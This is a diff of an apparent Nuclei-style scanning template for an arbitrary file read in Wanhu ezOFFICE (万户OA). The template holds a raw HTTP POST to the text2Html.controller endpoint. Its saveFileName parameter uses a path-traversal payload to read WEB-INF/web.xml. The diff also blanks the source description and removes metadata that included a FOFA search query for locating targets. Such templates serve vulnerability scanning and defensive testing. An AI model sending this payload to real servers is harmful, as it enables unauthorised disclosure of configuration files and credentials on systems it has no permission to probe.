@@ -3,12 +3,8 @@ info:
   name: 万户OA text2Html 任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eo9do2z41w4ph8g3'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: eo9do2z41w4ph8g3
-    fofa: app="万户网络-ezOFFICE"
 http:
 - raw:
   - 'POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     SL-CE-SUID: 1081
-
-
 
 
     saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
